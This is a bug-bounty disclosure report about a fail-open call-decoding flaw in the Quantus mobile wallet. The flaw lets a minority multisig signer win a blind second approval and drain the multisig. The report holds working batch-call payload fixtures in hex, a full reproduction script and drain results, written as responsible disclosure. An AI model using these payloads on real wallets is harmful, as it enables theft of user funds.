# 89011 w a high fail open runtime call decoding lets a minority multisig signer obtain approval for full balance theft

**Submitted on Aug 16th 2026 at 13:55:56 UTC by @rezarwz for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89011
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app>
* **Impacts:**
  * Direct theft of user funds

## Description

### Brief/Intro

The official Quantus mobile application fails open when stale generated metadata cannot decode a valid nested runtime call in a multisig proposal: it hides the recipient, amount, and failing child, shows no decoding warning, but keeps approval enabled and approves the exact hidden bytes. A malicious minority member of an ordinary 2-of-3 multisig, who cannot spend alone, can obtain the necessary second approval when an honest co-signer follows the normal approval flow and then execute a non-atomic batch that transfers the multisig's entire transferable native balance before the hidden child fails.

### Vulnerability Details

#### Affected revisions

The reproduction is pinned to the competition revisions:

| Component                          | Repository                                                      | Commit / runtime version                                                                                   |
| ---------------------------------- | --------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| Mobile application and Quantus SDK | `https://github.com/immunefi-team/audit-comp-quantus-apps.git`  | `d5fc4d6572ebc2244e95009a33f5da5048935867`; generated metadata for runtime spec 136, transaction version 3 |
| Chain and runtime                  | `https://github.com/immunefi-team/audit-comp-quantus-chain.git` | `3b243b870a5442a6e5f443056f67bbba87d472f5`; runtime spec 143, transaction version 3                        |

The attack uses an ordinary multisig. It does not require treasury, governance, Technical Collective, administrator, guardian, high-security, or other privileged membership. It also does not require a stolen credential, a malicious RPC, or falsified indexer data.

#### The application cannot decode a valid current-runtime child

The application's generated `RuntimeCall` codec recognizes Utility at pallet index 9, but it has no variant for the frozen runtime's Vesting pallet at index 22. Unknown variants throw:

```dart
final index = U8Codec.codec.decode(input);
switch (index) {
  // ...
  case 9:
    return Utility._decode(input);
  // ...
  case 20:
    return Wormhole._decode(input);
  default:
    throw Exception('RuntimeCall: Invalid variant index: "$index"');
}
```

The frozen runtime, by contrast, exposes `Utility` at index 9 and callable `Vesting` at index 22. `Utility.batch` decodes its `calls` field as a sequence of complete `RuntimeCall` values:

```dart
factory Batch._decode(Input input) {
  return Batch(
    calls: const SequenceCodec<RuntimeCall>(RuntimeCall.codec).decode(input),
  );
}
```

The full-drain fixture is a valid current-runtime call:

```
Utility[9].batch[0]([
  Balances[2].transfer_all[4](Id(attacker), false),
  Vesting[22].claim[0](18446744073709551615)
])
```

The app first recognizes and enters the Utility batch, then recursively decodes the balance-moving child. It throws only when it reaches the trailing Vesting child:

```
Exception: RuntimeCall: Invalid variant index: "22"
```

The bytes are not malformed. The frozen spec-143 runtime strictly decodes the same fixture with no trailing bytes.

#### Authoritative proposal enrichment erases useful review data

The proposal service correctly retrieves the stored call from `Multisig.Proposals`. It then attaches those authoritative bytes and asks the stale decoder for a summary. If decoding fails, `decodedCall` yields no usable summary, and the following code replaces a previously accurate recipient and amount with empty values:

```dart
final withBytes = p.copyWith(callRaw: call);
final summary = withBytes.decodedCall?.summary;
return withBytes.copyWith(
  recipient: summary?.recipient ?? '',
  amount: summary?.amount ?? BigInt.zero,
);
```

The component test deliberately begins with an accurate simulated proposal row, not false indexer data:

```
recipient = qzoCRk7oiLjFNmKVMWwXB3fwHFVsj8bHhgSTqe7Ufmz3tPQ5v
amount    = 42424242424242
```

After production enrichment loads and fails to decode the authoritative baseline bytes, the values are:

```
recipient = ""
amount    = 0
```

This means an honest indexer-provided transfer summary does not protect the reviewer from the decode failure.

#### The confirmation screen catches the error but does not block approval

The confirmation widget loads the authoritative bytes into `_callBytes`. Its display getter catches a decoding exception and continues:

```dart
DecodedCall? get _decodedProposalCall {
  final bytes = _callBytes;
  if (bytes != null) {
    try {
      return CallDecoder.decodeBytes(bytes);
    } catch (e) {
      quantusPrint('... could not decode stored proposal call: $e');
    }
  }
  return widget.proposal.decodedCall;
}
```

The widget then falls back to generic proposal labels. The approval gate covers a failure to *load* bytes, but not a failure to *decode* bytes that loaded successfully:

```dart
final decoded = _decodedProposalCall;
final headline = DecodedCallHeadline.of(
  decoded ?? _fallbackTransferCall,
  // ...
);

final blocked = _submitting || _loadingCallBytes || _callBytesFailed;

QuantusButton.simple(
  label: widget.labels.confirmLabel(l10n),
  isDisabled: blocked,
  onTap: blocked ? null : _confirm,
)
```

There is no durable decode-failure state in `blocked`. In the rendered production widget, the complete transaction-review text for the baseline fixture was:

```
Are you sure?
You are about to approve a transfer of
Batch
Utility
NETWORK FEE
0.000123456789 QUAN
Yes, Approve
No, Go Back
```

The displayed fee is a deterministic local test value, not a production fee measurement. The widget showed none of the following:

* the attacker's address;
* `42.424242424242` or its raw integer amount;
* `Vesting` or `claim`;
* `18446744073709551615` (`u64::MAX`);
* the raw SCALE call; or
* a loading or decoding warning.

The production button had a non-null callback and `isDisabled == false`.

#### Approval remains bound to the hidden bytes

The exact-byte protections introduced around multisig approval do work, but they bind the signature to bytes the screen failed to explain. `_confirm` sends `_callBytes` to the production callback:

```dart
await widget.submit(ref, signer, _networkFee, _callBytes);
```

The service constructs `Multisig.approve` with those same stored bytes:

```dart
final inner = callBytes ?? await fetchProposalCallBytes(
  msig: msig,
  proposalId: proposalId,
);
final call = buildApproveCall(
  msig: msig,
  proposalId: proposalId,
  call: inner,
);
```

The runtime also enforces exact equality:

```rust
if call != proposal.call {
    return Self::err_with_actual_weight(Error::<T>::CallMismatch, actual_weight)
}
```

The test changed one byte and received `CallMismatch`. For the unmodified fixture, the bytes proposed, stored, returned to the app, passed to the enabled callback, embedded in `Multisig.approve`, retained after approval, decoded for execution, and included in `ProposalExecuted` were equal. Thus the hidden call is not substituted after review; the application approves the exact undisclosed call.

#### The second approval is necessary

The attacker is one legitimate member of a funded threshold-2 multisig with three members. Proposing the call records only the attacker's approval. When the attacker attempts execution at that point, the actual Multisig pallet returns `ProposalNotApproved`, and no multisig funds move.

An honest second member must open the ordinary pending-proposal route and approve on the incomplete screen. That approval changes the proposal from `Active` to `Approved`. It does not execute automatically: the malicious member then performs a separate permitted `Multisig.execute`. Neither the victim nor the third signer needs to act again.

#### Runtime batch semantics preserve the transfer

At execution, the Multisig pallet decodes the stored call and dispatches it with the multisig account as the signed origin. The non-atomic `Utility.batch` dispatches children in order. If a child fails, it emits `BatchInterrupted` and returns `Ok`, preserving effects of earlier successful children:

```rust
if let Err(e) = result {
    Self::deposit_event(Event::BatchInterrupted {
        index: index as u32,
        error: e.error,
    });
    return Ok(Some(base_weight.saturating_add(weight)).into())
}
Self::deposit_event(Event::ItemCompleted);
```

`Balances.transfer_all(attacker, false)` executes first and transfers the multisig's entire transferable native balance. `Vesting.claim(u64::MAX)` executes second and fails with `NoSchedule`. A schedule at `u64::MAX` cannot be allocated by this pallet because schedule creation computes `schedule_id + 1` with checked arithmetic before insertion. The failure is therefore deterministic in the tested runtime state and does not rely on the victim having a particular vesting schedule.

Because `batch` reports the interruption while returning outer success, Multisig records `ProposalExecuted(result=Ok(()))` and removes the proposal. The preceding transfer remains committed. The executed `batch_all` control uses identical children but rolls the transfer back when Vesting fails, confirming that non-atomic `batch` semantics are necessary to the payload.

#### Attack prerequisites

| Capability or condition                                                                    | Required? | Detail                                                                                      |
| ------------------------------------------------------------------------------------------ | --------: | ------------------------------------------------------------------------------------------- |
| One legitimate key in an ordinary funded 2-of-3 multisig                                   |       Yes | The attacker starts with one vote, not an authorized quorum.                                |
| One honest member opens the pending proposal and approves                                  |       Yes | The victim takes a normal approval action after receiving the incomplete review.            |
| Separate execution by the attacker after threshold                                         |       Yes | The attacker executes once the proposal is approved.                                        |
| Third signer action                                                                        |        No | The third member never acts.                                                                |
| Treasury, governance, Technical Collective, administrator, guardian, or high-security role |        No | The tested multisig has no special enrollment or privilege.                                 |
| Stolen credentials or victim seed                                                          |        No | The honest member uses their own key and intentionally presses the enabled approval action. |
| Malicious RPC or false indexer row                                                         |        No | Tests use authoritative stored bytes and an accurate simulated proposal row.                |

### Impact Details

The affected approval is the missing authorization that separates a one-vote proposal from a proposal able to spend the multisig's balance. Before the honest approval, the runtime rejects the attacker with `ProposalNotApproved`. After it, the same attacker can execute the exact hidden call as the multisig. The on-chain threshold is not bypassed; the flaw defeats the informed-approval security that the 2-of-3 policy is meant to provide.

The baseline fixture transferred exactly `42.424242424242 QUAN`:

```
Multisig immediately before execution: 1,000.000000000000 QUAN
Multisig immediately after execution:    957.575757575758 QUAN
Attacker total-balance delta:             +42.424242424242 QUAN
Multisig balance delta:                   -42.424242424242 QUAN
```

The harness compares total balances across execution so returning the proposal deposit does not inflate the transfer delta.

The stronger `Balances.transfer_all(attacker, false)` fixture then drained the entire transferable native balance remaining in the harness:

```
Multisig immediately before execution: 957.575757575758 QUAN
Multisig immediately after execution:    0.000000000000 QUAN
Attacker balance delta:                +957.575757575758 QUAN
```

The practical amount at risk in one exploit proposal is the ordinary multisig's entire transferable native balance at execution. This does not claim transfer of unrelated asset classes or balances that the runtime does not consider transferable. Critical is justified because a minority signer who lacks quorum can use one incomplete but enabled approval to make a full-balance theft executable, and the runtime reproduction demonstrates that loss rather than only a misleading display.

The victim does participate: an honest member opens the pending proposal and approves it. The direct-loss classification remains appropriate because the official security review omits every material transfer parameter while presenting an enabled approval action, allowing a minority member who cannot spend alone to obtain the authorization needed to steal user-controlled multisig funds.

## Link to Proof of Concept

<https://gist.github.com/rezarwz-sec/a3f2f87dd4407656fb18cb587dcf8fb3>

## Proof of Concept

The reproduction has two byte-joined tracks. The Flutter track proves what the honest signer sees and what bytes the production approval path forwards. The Rust track proves the fixtures' lifecycle and direct financial effect in the actual frozen runtime. The text-only Gist carries canonical fixture hex; the setup below reconstructs the binary files, and the runtime harness independently generates the same bytes from the frozen Runtime before execution.

### Fixtures

#### Baseline transfer

```
Gist file:  baseline_call.hex
Binary:     fixtures/baseline-call.scale (reconstructed from the hex)
Length:     55 bytes
SHA-256:    fa9413540d1fc130e0ac65dd679bb4af952138f3a3c5c00980e0f16fd2b3a34f
Blake2-256: 5eaf30bc80bb3a7e2f450c270845f5743df831eb103269e81b85b0ac6cbefcaa
Hex:        090008020000a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a50bb249e6a995261600ffffffffffffffff
Call:       Utility.batch([
              Balances.transfer_allow_death(Id(attacker), 42424242424242),
              Vesting.claim(18446744073709551615)
            ])
```

#### Full-balance transfer

```
Gist file:  full_drain_call.hex
Binary:     fixtures/full-drain-call.scale (reconstructed from the hex)
Length:     49 bytes
SHA-256:    a8e24e7ab4104ff45352e7018409a23cca52e2fcd5b4636acc1fd002a5c2f94b
Blake2-256: e0c7ed6b748dc3d6578715d22f212f8593380809075f3d32d2bd8ad073b8670b
Hex:        090008020400a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5001600ffffffffffffffff
Call:       Utility.batch([
              Balances.transfer_all(Id(attacker), false),
              Vesting.claim(18446744073709551615)
            ])
```

The attacker is the deterministic local test account `[0xa5; 32]`. It is not a production account or credential.

### Prerequisites and clean setup

Required tools are Bash 4 or newer, Git, `tar`, `xxd`, GNU `sha256sum`, Rust with Cargo and rustfmt, and Flutter with Dart. Network access is needed for fresh source clones and normal locked dependency retrieval. Validation used Flutter 3.47.0, Dart 3.13.0, rustc 1.97.0, and Cargo 1.97.0; these record the executed environment, not asserted minimum versions. No node, chain specification, wallet seed, public RPC, or production indexer is needed.

The supporting Gist is flat and text-only. The supporting PoC files are provided separately through the form’s PoC link field. Run the following commands in one Bash session, supplying that URL when prompted. The checksum check covers every Gist file except `SHA256SUMS` itself.

```bash
set -euo pipefail

mkdir quantus-poc-review
cd quantus-poc-review
read -r -p 'Secret Gist URL: ' QUANTUS_POC_GIST_URL
git clone "${QUANTUS_POC_GIST_URL%.git}.git" quantus-multisig-hidden-transfer-poc
cd quantus-multisig-hidden-transfer-poc

POC_FILES_DIRECTORY="$(pwd -P)"
# Record the cloned supporting PoC revision for reproducibility.
git rev-parse HEAD
sha256sum --check SHA256SUMS

REPRODUCTION_DIRECTORY="$POC_FILES_DIRECTORY/../quantus-multisig-hidden-transfer-reproduction"
test ! -e "$REPRODUCTION_DIRECTORY"
mkdir "$REPRODUCTION_DIRECTORY"
REPRODUCTION_DIRECTORY="$(cd "$REPRODUCTION_DIRECTORY" && pwd -P)"

APPS_REPOSITORY="$REPRODUCTION_DIRECTORY/frozen-apps-repository"
CHAIN_REPOSITORY="$REPRODUCTION_DIRECTORY/frozen-chain"

git clone https://github.com/immunefi-team/audit-comp-quantus-apps.git "$APPS_REPOSITORY"
git -C "$APPS_REPOSITORY" fetch --no-tags origin d5fc4d6572ebc2244e95009a33f5da5048935867
git -C "$APPS_REPOSITORY" checkout --detach d5fc4d6572ebc2244e95009a33f5da5048935867
git -C "$APPS_REPOSITORY" submodule update --init --recursive

git clone https://github.com/immunefi-team/audit-comp-quantus-chain.git "$CHAIN_REPOSITORY"
git -C "$CHAIN_REPOSITORY" fetch --no-tags origin 3b243b870a5442a6e5f443056f67bbba87d472f5
git -C "$CHAIN_REPOSITORY" checkout --detach 3b243b870a5442a6e5f443056f67bbba87d472f5
git -C "$CHAIN_REPOSITORY" submodule update --init --recursive

test "$(git -C "$APPS_REPOSITORY" remote get-url origin)" = \
  "https://github.com/immunefi-team/audit-comp-quantus-apps.git"
test "$(git -C "$APPS_REPOSITORY" rev-parse HEAD)" = \
  "d5fc4d6572ebc2244e95009a33f5da5048935867"
test -z "$(git -C "$APPS_REPOSITORY" status --porcelain=v1 --untracked-files=all)"
test -z "$(git -C "$APPS_REPOSITORY" submodule status --recursive | sed -n '/^[-+U]/p')"

test "$(git -C "$CHAIN_REPOSITORY" remote get-url origin)" = \
  "https://github.com/immunefi-team/audit-comp-quantus-chain.git"
test "$(git -C "$CHAIN_REPOSITORY" rev-parse HEAD)" = \
  "3b243b870a5442a6e5f443056f67bbba87d472f5"
test -z "$(git -C "$CHAIN_REPOSITORY" status --porcelain=v1 --untracked-files=all)"
test -z "$(git -C "$CHAIN_REPOSITORY" submodule status --recursive | sed -n '/^[-+U]/p')"
```

Create disposable Flutter and Cargo layouts, reconstruct both binary fixtures from the canonical hex, and copy a tracked-only snapshot of the frozen app. These operations do not modify either source checkout.

```bash
APP_HARNESS="$REPRODUCTION_DIRECTORY/app-poc"
RUNTIME_HARNESS="$REPRODUCTION_DIRECTORY/runtime-poc"
FROZEN_APP_SNAPSHOT="$REPRODUCTION_DIRECTORY/frozen-apps"
FIXTURE_DIRECTORY="$REPRODUCTION_DIRECTORY/fixtures"
OUTPUT_DIRECTORY="$REPRODUCTION_DIRECTORY/run-output"
CACHE_DIRECTORY="$REPRODUCTION_DIRECTORY/cache"

mkdir -p "$APP_HARNESS/test" "$RUNTIME_HARNESS/src" \
  "$FROZEN_APP_SNAPSHOT" "$FIXTURE_DIRECTORY" \
  "$OUTPUT_DIRECTORY" "$CACHE_DIRECTORY"

cp "$POC_FILES_DIRECTORY/flutter_pubspec.yaml" "$APP_HARNESS/pubspec.yaml"
cp "$POC_FILES_DIRECTORY/flutter_pubspec.lock" "$APP_HARNESS/pubspec.lock"
cp "$POC_FILES_DIRECTORY/multisig_hidden_transfer_test.dart" \
  "$APP_HARNESS/test/multisig_hidden_transfer_test.dart"
cp "$POC_FILES_DIRECTORY/runtime_Cargo.toml" "$RUNTIME_HARNESS/Cargo.toml"
cp "$POC_FILES_DIRECTORY/runtime_Cargo.lock" "$RUNTIME_HARNESS/Cargo.lock"
cp "$POC_FILES_DIRECTORY/runtime_main.rs" "$RUNTIME_HARNESS/src/main.rs"

tr -d '[:space:]' < "$POC_FILES_DIRECTORY/baseline_call.hex" | \
  xxd -r -p > "$FIXTURE_DIRECTORY/baseline-call.scale"
tr -d '[:space:]' < "$POC_FILES_DIRECTORY/full_drain_call.hex" | \
  xxd -r -p > "$FIXTURE_DIRECTORY/full-drain-call.scale"

test "$(wc -c < "$FIXTURE_DIRECTORY/baseline-call.scale" | tr -d ' ')" = 55
test "$(wc -c < "$FIXTURE_DIRECTORY/full-drain-call.scale" | tr -d ' ')" = 49
printf '%s  %s\n' \
  fa9413540d1fc130e0ac65dd679bb4af952138f3a3c5c00980e0f16fd2b3a34f \
  "$FIXTURE_DIRECTORY/baseline-call.scale" | sha256sum --check --status -
printf '%s  %s\n' \
  a8e24e7ab4104ff45352e7018409a23cca52e2fcd5b4636acc1fd002a5c2f94b \
  "$FIXTURE_DIRECTORY/full-drain-call.scale" | sha256sum --check --status -

git -C "$APPS_REPOSITORY" archive --format=tar HEAD mobile-app quantus_sdk | \
  tar -xf - -C "$FROZEN_APP_SNAPSHOT"
: > "$FROZEN_APP_SNAPSHOT/mobile-app/.env"
```

Run the Flutter track with its locked dependencies:

```bash
cd "$APP_HARNESS"
CARGO_TARGET_DIR="$CACHE_DIRECTORY/flutter-rust-target" \
  flutter pub get --enforce-lockfile
CARGO_TARGET_DIR="$CACHE_DIRECTORY/flutter-rust-target" \
  flutter test --no-pub test/multisig_hidden_transfer_test.dart \
  --reporter expanded 2>&1 | tee "$OUTPUT_DIRECTORY/application-raw-output.txt"

grep -F 'APPLICATION_DECODER_EXCEPTION=Exception: RuntimeCall: Invalid variant index: "22"' \
  "$OUTPUT_DIRECTORY/application-raw-output.txt"
grep -F 'APPROVE_ENABLED=true' "$OUTPUT_DIRECTORY/application-raw-output.txt"
grep -F 'APPROVAL_CALLBACK_INVOKED=true' "$OUTPUT_DIRECTORY/application-raw-output.txt"
grep -F 'SUBMISSION_INNER_SHA256=fa9413540d1fc130e0ac65dd679bb4af952138f3a3c5c00980e0f16fd2b3a34f' \
  "$OUTPUT_DIRECTORY/application-raw-output.txt"
grep -F 'FULL_DRAIN_FIXTURE_SHA256=a8e24e7ab4104ff45352e7018409a23cca52e2fcd5b4636acc1fd002a5c2f94b' \
  "$OUTPUT_DIRECTORY/application-raw-output.txt"
grep -F 'FULL_DRAIN_APPROVE_INNER_SHA256=a8e24e7ab4104ff45352e7018409a23cca52e2fcd5b4636acc1fd002a5c2f94b' \
  "$OUTPUT_DIRECTORY/application-raw-output.txt"
grep -F 'SUPPORTED_TRANSFER_WIDGET_RECIPIENT_VISIBLE=true' \
  "$OUTPUT_DIRECTORY/application-raw-output.txt"
grep -F 'SUPPORTED_TRANSFER_WIDGET_AMOUNT_VISIBLE=true' \
  "$OUTPUT_DIRECTORY/application-raw-output.txt"
grep -F 'APPLICATION_TRACK_RESULT=PASS' "$OUTPUT_DIRECTORY/application-raw-output.txt"
test -f "$APP_HARNESS/artifacts/approval-screen.png"
```

Run the runtime track against the actual frozen Runtime and pallets:

```bash
cd "$RUNTIME_HARNESS"
cargo fmt --check
SKIP_WASM_BUILD=1 CARGO_TARGET_DIR="$CACHE_DIRECTORY/cargo-target" \
  cargo run --locked 2>&1 | tee "$OUTPUT_DIRECTORY/runtime-raw-output.txt"

grep -F 'minority_cannot_move_funds=true' "$OUTPUT_DIRECTORY/runtime-raw-output.txt"
grep -F 'message: Some("CallMismatch")' "$OUTPUT_DIRECTORY/runtime-raw-output.txt"
grep -F 'batch_all_rolled_back_transfer=true' "$OUTPUT_DIRECTORY/runtime-raw-output.txt"
grep -F 'transfer_all_full_balance_drained=true' "$OUTPUT_DIRECTORY/runtime-raw-output.txt"
grep -F 'RUNTIME_TRACK_RESULT=PASS' "$OUTPUT_DIRECTORY/runtime-raw-output.txt"
```

Finally, verify both fixture identities again and prove the frozen source checkouts stayed pinned and clean:

```bash
printf '%s  %s\n' \
  fa9413540d1fc130e0ac65dd679bb4af952138f3a3c5c00980e0f16fd2b3a34f \
  "$FIXTURE_DIRECTORY/baseline-call.scale" | sha256sum --check -
printf '%s  %s\n' \
  a8e24e7ab4104ff45352e7018409a23cca52e2fcd5b4636acc1fd002a5c2f94b \
  "$FIXTURE_DIRECTORY/full-drain-call.scale" | sha256sum --check -
test "$(git -C "$APPS_REPOSITORY" rev-parse HEAD)" = \
  "d5fc4d6572ebc2244e95009a33f5da5048935867"
test -z "$(git -C "$APPS_REPOSITORY" status --porcelain=v1 --untracked-files=all)"
test -z "$(git -C "$APPS_REPOSITORY" submodule status --recursive | sed -n '/^[-+U]/p')"
test "$(git -C "$CHAIN_REPOSITORY" rev-parse HEAD)" = \
  "3b243b870a5442a6e5f443056f67bbba87d472f5"
test -z "$(git -C "$CHAIN_REPOSITORY" status --porcelain=v1 --untracked-files=all)"
test -z "$(git -C "$CHAIN_REPOSITORY" submodule status --recursive | sed -n '/^[-+U]/p')"
```

The application track passes only when its Flutter test and all marker checks succeed. The runtime track passes only when the Rust process and its marker checks succeed. Both are required; `BatchInterrupted` is the expected partial execution inside the malicious call, not a partial test result.

### Full attack flow exercised by the tests

{% stepper %}
{% step %}

## The runtime harness creates the multisig

The runtime harness creates an ordinary multisig with deterministic members A, B, and C and threshold 2. It funds the derived multisig account with `1,000 QUAN` and confirms that it has no high-security enrollment.
{% endstep %}

{% step %}

## Malicious member A proposes the fixture

Malicious member A proposes the exact baseline fixture. The real Multisig pallet stores the 55 bytes with A as the only approver.
{% endstep %}

{% step %}

## A attempts execution before approval

A attempts to execute. The runtime returns `ProposalNotApproved`, and the harness asserts that no multisig value moved.
{% endstep %}

{% step %}

## The app harness loads the stored fixture

The app harness supplies an accurate pending-proposal row and returns the exact stored fixture through the generated production storage interface over loopback JSON-RPC.
{% endstep %}

{% step %}

## The production decoder fails on Vesting

The frozen production decoder enters `Utility.batch`, decodes child 0, and throws on Vesting variant 22 at child 1.
{% endstep %}

{% step %}

## Proposal enrichment removes review details

Production proposal enrichment changes the accurate attacker/amount fields to an empty recipient and zero.
{% endstep %}

{% step %}

## The confirmation widget remains actionable

The test renders the real confirmation widget. It captures the generic `Batch / Utility` review, proves the attacker, amount, Vesting call, argument, raw bytes, and warning are absent, and verifies that **Yes, Approve** is enabled.
{% endstep %}

{% step %}

## The enabled callback forwards the hidden bytes

The component harness directly invokes that enabled production callback after rendering. It intercepts final submission at a local boundary and verifies that the callback and generated `Multisig.approve` builder contain the exact 55-byte fixture.
{% endstep %}

{% step %}

## Honest member B approves the unmodified bytes

The runtime test mutates one byte and confirms `CallMismatch`. It then submits honest member B's approval with the unmodified stored bytes. The proposal reaches `Approved` with two approvals.
{% endstep %}

{% step %}

## A executes the stored batch

A separately executes. The runtime dispatches the stored batch as the multisig. The balance transfer completes, the Vesting child returns `NoSchedule`, Utility emits `BatchInterrupted` at index 1, and Multisig records outer success with the exact stored call.
{% endstep %}

{% step %}

## The harness verifies batch behavior

The harness proves the baseline transfer remains and then runs `batch_all` with the same children, proving the atomic form rolls the transfer back.
{% endstep %}

{% step %}

## The full-balance fixture drains the multisig

The harness repeats the real 2-of-3 lifecycle with the 49-byte `transfer_all(false)` fixture and transfers the multisig's entire remaining transferable native balance to A.
{% endstep %}
{% endstepper %}

### Expected and observed application results

| Check                                                        | Expected                                                    | Observed                                                                                                     |
| ------------------------------------------------------------ | ----------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------ |
| Supported `Balances.transfer_allow_death` control            | Decode normally and display recipient/amount                | Recipient and `42.424242424242` displayed                                                                    |
| Malicious baseline fixture                                   | Recursive decode reaches unknown child                      | `Exception: RuntimeCall: Invalid variant index: "22"`                                                        |
| Accurate proposal summary after authoritative decode failure | Security-preserving behavior would retain or block          | Production code replaced recipient with `""` and amount with `0`                                             |
| Review content                                               | Security-preserving behavior would show details or an error | Only generic `Batch / Utility` information; hidden values and warning absent                                 |
| Approval state                                               | Security-preserving behavior would disable approval         | Production approval callback remained enabled                                                                |
| Callback and builder bytes                                   | Must equal authoritative fixture                            | SHA-256 matched `fa9413540d1fc130e0ac65dd679bb4af952138f3a3c5c00980e0f16fd2b3a34f`                           |
| Full-balance fixture                                         | Same decoder failure and exact-byte builder                 | Both conditions observed; SHA-256 matched `a8e24e7ab4104ff45352e7018409a23cca52e2fcd5b4636acc1fd002a5c2f94b` |

Representative successful application markers are:

```
APPLICATION_DECODER_EXCEPTION=Exception: RuntimeCall: Invalid variant index: "22"
SUPPORTED_TRANSFER_WIDGET_RECIPIENT_VISIBLE=true
SUPPORTED_TRANSFER_WIDGET_AMOUNT_VISIBLE=true
AFTER_ONCHAIN_RECIPIENT=
AFTER_ONCHAIN_AMOUNT=0
ATTACKER_VISIBLE=false
TRANSFER_AMOUNT_VISIBLE=false
VESTING_VISIBLE=false
CLAIM_VISIBLE=false
U64_MAX_VISIBLE=false
RAW_CALL_VISIBLE=false
DECODING_WARNING_VISIBLE=false
APPROVE_ENABLED=true
APPROVAL_CALLBACK_INVOKED=true
SUBMISSION_INNER_SHA256=fa9413540d1fc130e0ac65dd679bb4af952138f3a3c5c00980e0f16fd2b3a34f
FULL_DRAIN_APPROVE_INNER_SHA256=a8e24e7ab4104ff45352e7018409a23cca52e2fcd5b4636acc1fd002a5c2f94b
APPLICATION_TRACK_RESULT=PASS
```

### Expected and observed runtime results

| Check                                     | Expected                                 | Observed                                                    |
| ----------------------------------------- | ---------------------------------------- | ----------------------------------------------------------- |
| Strict current-runtime decode             | Valid complete call, no trailing bytes   | Both fixtures decoded completely                            |
| Proposal storage                          | Stored bytes equal proposed fixture      | `proposed_eq_stored=true`                                   |
| Attacker execution before second approval | Rejected without value movement          | `ProposalNotApproved`; no movement                          |
| Modified approval bytes                   | Rejected                                 | `CallMismatch`                                              |
| Honest second approval                    | Exact stored bytes retained              | `approval_input_eq_stored=true`, `stored_eq_approved=true`  |
| Baseline execution                        | Child 0 persists despite child 1 failure | Exact `42.424242424242 QUAN` transfer persisted             |
| `batch_all` control                       | Child 0 rolled back                      | Both attacker and multisig deltas were zero                 |
| Full-balance fixture                      | Entire transferable native balance moves | `957.575757575758 QUAN` moved; multisig balance became zero |
| Executed call identity                    | Event call equals stored proposal        | `stored_eq_executed_event=true`                             |

The relevant baseline event order was:

```
Balances.Unreserved(attacker, proposal deposit)
Balances.Transfer(multisig, attacker, 42424242424242)
Utility.ItemCompleted
Utility.BatchInterrupted(index=1, error=Vesting.NoSchedule)
Multisig.ProposalExecuted(call=exact fixture, result=Ok(()))
```

The full-drain execution produced this order:

```
Balances.Unreserved(attacker, proposal deposit)
System.KilledAccount(multisig)
Balances.Transfer(multisig, attacker, 957575757575758)
Utility.ItemCompleted
Utility.BatchInterrupted(index=1, error=Vesting.NoSchedule)
Multisig.ProposalExecuted(call=exact full-drain fixture, result=Ok(()))
```

`NoSchedule` is the Vesting dispatch error carried by `BatchInterrupted`, not a separate event. The following `ProposalExecuted(result=Ok(()))` records Utility's successful outer return after the interruption.

A normalized summary of the successful runtime evidence is:

```
runtime_spec_version=143
threshold=2 signer_count=3
proposed_eq_stored=true
minority_execute_before_approval=ProposalNotApproved
minority_cannot_move_funds=true
modified_byte_control=CallMismatch
approval_input_eq_stored=true
stored_eq_approved=true
stored_eq_executed_event=true
second_child_error=Vesting.NoSchedule
first_child_transfer_persisted=true
batch_all_rolled_back_transfer=true
full_drain_multisig_before=957575757575758
full_drain_multisig_after=0
full_drain_attacker_delta=957575757575758
transfer_all_full_balance_drained=true
RUNTIME_TRACK_RESULT=PASS
```

These observations establish the authorization and loss chain: one signer is insufficient; the incomplete official review remains actionable; the approval is byte-bound to the hidden proposal; the second approval makes it executable; and execution moves the ordinary multisig's transferable native balance to the attacker.

### Exact-byte invariant

| Handoff                                                      | Executed result                         |
| ------------------------------------------------------------ | --------------------------------------- |
| Runtime-generated proposal fixture                           | 55-byte baseline with canonical SHA-256 |
| `Multisig.propose` into actual pallet storage                | Byte-equal                              |
| Authoritative storage response loaded by production app code | Byte-equal                              |
| Enabled production approval callback                         | Byte-equal                              |
| Generated `Multisig.approve` inner call                      | Byte-equal                              |
| Post-approval proposal storage                               | Byte-equal                              |
| Runtime decode and `ProposalExecuted.call`                   | Byte-equal                              |

The one-byte mutation control failing with `CallMismatch` confirms that this equality is enforced rather than incidental.

### Evidence boundaries

The Flutter and runtime tracks are a split, byte-joined integration reproduction, not one live application-to-node transaction trace.

* The production Quantus indexer was not executed. The application test supplies an accurate simulated proposal row. No dishonest indexer data is required, but normal production discoverability remains conditional on the honest indexer returning the pending proposal.
* The real vulnerable widget and enabled production callback were exercised with the 55-byte baseline fixture. The 49-byte full-drain fixture reached the same production decoder exception and exact `Multisig.approve` builder, then completed the ordinary multisig lifecycle in the runtime harness. A full-drain widget/callback interaction was not performed.
* The Flutter test exercises the frozen production decoder, proposal enrichment, approve builder, callback, and real confirmation widget. It is not a release APK, emulator recording, or physical-device test.
* The enabled production callback is invoked directly after rendering; no physical tap is claimed.
* Biometric UI and the hardware-wallet QR flow were not executed.
* Final network submission is intercepted at a local boundary. Application transport is loopback-only.
* The runtime test uses the actual frozen Runtime and Multisig, Utility, Balances, and Vesting pallets in native `TestExternalities`. It uses direct pallet dispatch, not a signed local-node extrinsic or authored block.
* No block hash, extrinsic hash, genesis hash, signed-extension trace, production indexer result, or production network-fee measurement is claimed.

### Prior remediation context

PR #549, which was closed without merge, is broad prior art for wrapped multisig calls and misleading display data. I do not claim that the general display-versus-signed-call class is new. Merged PRs #575 and #585 subsequently added authoritative stored-call loading, exact-byte use during approval, and strict recursive decoding. Chain PR #622 enforces byte equality at approval.

Callable Vesting variant 22 was added later in chain PR #646, after those fixes and after the frozen app's generated spec-136 metadata. The issue reproduced here is a post-remediation fail-open bypass: strict decoding correctly rejects the newer nested variant, but a higher-level catch turns that error into an incomplete, approval-capable confirmation while the exact hidden authoritative bytes are still passed into approval. It is not a generic indexer-spoofing report, and the PoC does not depend on false indexer data.
